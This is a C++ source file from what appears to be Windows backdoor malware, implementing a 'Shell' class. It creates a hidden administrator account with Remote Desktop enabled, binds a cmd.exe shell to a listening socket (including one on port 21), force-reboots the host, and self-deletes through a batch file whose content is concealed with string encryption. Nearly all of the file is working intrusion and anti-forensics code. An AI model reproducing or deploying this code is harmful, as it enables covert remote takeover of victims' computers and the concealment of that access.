/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "cshell.h"

#include <cstdio>
#include <iostream>

#include "print.h"
#include "network.h"
#include "global.h"
#include "tcp.h"
#include "macro.h"
#include "info.h"
#include "crypted_global.h"
#include "register.h"

#include "memory_debug.h"

#define BUFFER_SIZE 1024

#pragma warning( disable : 4800 ) // stupid warning about bool

void Shell::executeCmd(const char *arguments){
	Shell::execute("cmd.exe /C", arguments);
}

void Shell::addRdpUser(const char *username, const char *password){
	std::string rdu = Info::getNameFromSid("S-1-5-32-555");
	MYPRINTF("RDU: %s\n", rdu.c_str());

	if (rdu.empty()){
		return;
	}

	std::string admin = Info::getNameFromSid("S-1-5-32-544");
	MYPRINTF("ADMIN: %s\n", admin.c_str());

	if (admin.empty()){
		return;
	}

	char buffer[BUFFER_SIZE];
	sprintf_s(buffer, BUFFER_SIZE, "net user %s %s /add", username, password);
	Shell::executeCmd(buffer);
	MYPRINTF("user added\n");
	Sleep(1000);

	Register reg;
	reg.createDwordKey(HKEY_LOCAL_MACHINE, 
							"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
							username,
							0);

	reg.createDwordKey(HKEY_LOCAL_MACHINE, 
						"System\\CurrentControlSet\\Control\\Terminal Server",
						"fDenyTSConnections",
						0);




	sprintf_s(buffer, BUFFER_SIZE, "net localgroup \"%s\" \"%s\" /add", rdu.c_str(), username);
	Shell::executeCmd(buffer);
	Sleep(1000);



	sprintf_s(buffer, BUFFER_SIZE, "net localgroup \"%s\" \"%s\" /add", admin.c_str(), username);
	Shell::executeCmd(buffer);
	Sleep(1000);

	sprintf_s(buffer, BUFFER_SIZE, "sc start termservice");
	Shell::executeCmd(buffer);
	Sleep(1000);
}

void Shell::removeRdpUser(const char *username){
	char buffer[BUFFER_SIZE];
	
	sprintf_s(buffer, BUFFER_SIZE, "net user %s /delete", username);
	Shell::executeCmd(buffer);
	MYPRINTF("user removed\n");

	// TODO: remove from UserList
}

std::string Shell::getCmdOutput(const char *arguments){
	char szCmdline[BUFFER_SIZE];
	sprintf_s(szCmdline, BUFFER_SIZE, "cmd.exe /C %s", arguments);
	return Shell::getProcessOutput(szCmdline);
}

std::string Shell::getProcessOutput(const char *arguments){
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	HANDLE g_hChildStd_ERR_Rd = NULL;
	HANDLE g_hChildStd_ERR_Wr = NULL;
	SECURITY_ATTRIBUTES sa; 
    // Set the bInheritHandle flag so pipe handles are inherited. 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 
    // Create a pipe for the child process's STDERR. 
    if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) {
        return "";
    }
    // Ensure the read handle to the pipe for STDERR is not inherited.
    if ( ! SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0) ){
        return "";
    }
    // Create a pipe for the child process's STDOUT. 
    if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0) ) {
		return "";
    }
    // Ensure the read handle to the pipe for STDOUT is not inherited
    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) ){
		return "";
    }
    // Create the child process. 
    // Set the text I want to run
	char szCmdline[BUFFER_SIZE];
	sprintf_s(szCmdline, BUFFER_SIZE, "%s", arguments);

    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
    bool bSuccess = FALSE; 

    // Set up members of the PROCESS_INFORMATION structure. 
    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 
    bSuccess = CreateProcess(NULL, 
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    CloseHandle(g_hChildStd_ERR_Wr);
    CloseHandle(g_hChildStd_OUT_Wr);
    // If an error occurs, exit the application. 
    if ( ! bSuccess ) {
        return "";
    }

    // Read from pipe that is the standard output for child process. 
    DWORD dwRead; 
    CHAR chBuf[4096];

    std::string out = "", err = "";
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        out += s;
    } 
    dwRead = 0;
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, 4096, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        err += s;

    } 
    // The remaining open handles are cleaned up when this process terminates. 
    // To avoid resource leaks in a larger application, 
    //   close handles explicitly.
    return out; 
}

void Shell::execute(const char *filename, const char *arguments){
	char buffer[BUFFER_SIZE];
	BOOL res;
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	LPSTR szCmdline;

	sprintf_s(buffer, BUFFER_SIZE, "%s %s", filename, arguments);

	szCmdline = _strdup(buffer);

	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.cb = sizeof(STARTUPINFO);

	ZeroMemory( &processInformation, sizeof(processInformation) );

	res = CreateProcess(0, szCmdline, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
	if (res == 0){
		MYPRINTF("ERROR: CreateProcess failed!%d", GetLastError());
	}
	free(szCmdline);
}

bool Shell::openShell(int port){
	SOCKET clientSocket;
	try {
		std::string publicIp = Global::get().getPublicIp();
		Tcp tcp(publicIp.c_str(), port);
		tcp.tcpbind();
		tcp.tcplisten();
		// Accept a client socket
		clientSocket = 0;
		while(clientSocket == 0){
			tcp.selectwrite();
			clientSocket = tcp.tcpaccept();
		}

		openShellOnSocket(clientSocket);

		closesocket(clientSocket);
	} catch (std::exception e){
		MYPRINTF("exception: %s\n", e.what());
	}
	return true;
}

void Shell::openShellOnSocket(SOCKET clientSocket){
	PROCESS_INFORMATION processInformation;
	// Options for process
	STARTUPINFO startupInfo;
	LPSTR szCmdline = _strdup("cmd");

	ZeroMemory( &processInformation, sizeof(processInformation) );
	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.cb = sizeof(STARTUPINFO);
	// Attach the socket to the process
	startupInfo.hStdInput = (HANDLE) clientSocket;
	startupInfo.hStdError = (HANDLE) clientSocket;
	startupInfo.hStdOutput = (HANDLE) clientSocket;

	CreateProcess(0, szCmdline, 0, 0, TRUE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);

	//WaitForSingleObject(processInformation.hProcess, INFINITE);

	free(szCmdline);
}

int Shell::openShellOnFtp(){
	return Shell::openShell(21);
}

bool Shell::reboot(){
	if (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER) == 0) {
		MYPRINTF( "ExitWindowsEx failed with error: %d\n", GetLastError());
		return false;
	}
	return true;
}

int Shell::killAtNextReboot(){
	MoveFileEx(Info::getModulePath().c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	return 0;
}

void Shell::deleteCurrent(){
	HANDLE hFile;
	DWORD  dwBytesWritten;
	char buffer[512];
	BOOL res;
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	LPSTR szCmdline;
	char * batfile = "dte.bat";

	sprintf_s(buffer, 512, SnE("6g6m0qfavob2X3GSSM11s0hE2JJKkiQO2pYoZ+fQd+9yzdE4ae+PIuQik3jQroz5krr74dLAXDHgk/QY", "'ping -n 20 127.0.0.1\r\ndel \"%s\"\r\ndel \"%s\"\r\nexit\r\n'"), Info::getModuleName().c_str(), batfile);

	hFile = CreateFile(batfile,
		FILE_WRITE_DATA,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	WriteFile(hFile, buffer, strlen(buffer), &dwBytesWritten, NULL);
	CloseHandle(hFile);

	szCmdline = _strdup(batfile);


	ZeroMemory( &startupInfo, sizeof(startupInfo) );
	startupInfo.cb = sizeof(STARTUPINFO);


	ZeroMemory( &processInformation, sizeof(processInformation) );

	res = CreateProcess(0, szCmdline, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
	if (res == 0){
		MYPRINTF("ERROR: CreateProcess failed!%d", GetLastError());
	}
}